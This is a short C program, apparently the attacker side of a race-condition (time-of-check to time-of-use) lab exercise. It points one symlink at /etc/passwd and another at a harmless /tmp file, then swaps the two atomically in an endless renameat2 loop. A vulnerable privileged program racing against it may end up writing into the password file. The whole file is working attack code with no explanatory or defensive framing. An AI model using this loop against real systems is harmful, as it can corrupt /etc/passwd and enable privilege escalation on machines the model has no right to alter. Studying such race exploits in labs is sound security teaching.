#define _GNU_SOURCE

#include <unistd.h>
#include <stdio.h>
int main() {
    unlink("/tmp/XYZ");
    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/XYZ");
    symlink("/tmp/XXX"   , "/tmp/ABC");
    while(1) {
    	// exchange 2 symlinks atomically
    	renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE);
    }
    return 0;
}
